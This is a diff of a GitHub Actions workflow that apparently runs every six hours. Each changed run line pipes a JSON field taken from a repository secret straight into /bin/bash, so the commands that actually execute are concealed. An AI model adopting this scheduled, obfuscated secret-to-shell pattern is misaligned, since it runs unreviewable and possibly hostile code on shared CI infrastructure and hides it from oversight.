@@ -3,8 +3,7 @@ name: wuzhurong1122
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 2/6 * * *'
-
+    - cron: '30 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,20 +11,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: wuzhurong1122
         env:
-          olt2968: ${{ secrets.olt2968 }}
+          mo5289: ${{ secrets.mo5289 }}
         run: |
-          echo $olt2968 | jq -r .mzn266 | /bin/bash
-          echo $oq16151 | jq -r .gg3 | /bin/bash
-          echo $fqam8317 | jq -r .uzup2 | /bin/bash
-          echo $zfr06 | jq -r .fzqyg3452 | /bin/bash
-          echo $qeku6 | jq -r .mwrp1677 | /bin/bash
-          echo $mp9 | jq -r .mirry693 | /bin/bash
-          echo $jabxj3741 | jq -r .ivud70286 | /bin/bash
-          echo $wo6867 | jq -r .aqbv2 | /bin/bash
-          echo $tsti6 | jq -r .jrwf395 | /bin/bash
-          echo $p68835 | jq -r .vulah12 | /bin/bash
-          echo $cue00 | jq -r .af7409 | /bin/bash
-          echo $igsjj6043 | jq -r .loas111 | /bin/bash
-          echo $pnbd85325 | jq -r .g9330 | /bin/bash
-          echo $enl02631 | jq -r .dauti3 | /bin/bash
+          echo $mo5289 | jq -r .tppq914 | /bin/bash
+          echo $am81 | jq -r .nl8 | /bin/bash
+          echo $qtz3954 | jq -r .ewj23565 | /bin/bash
 
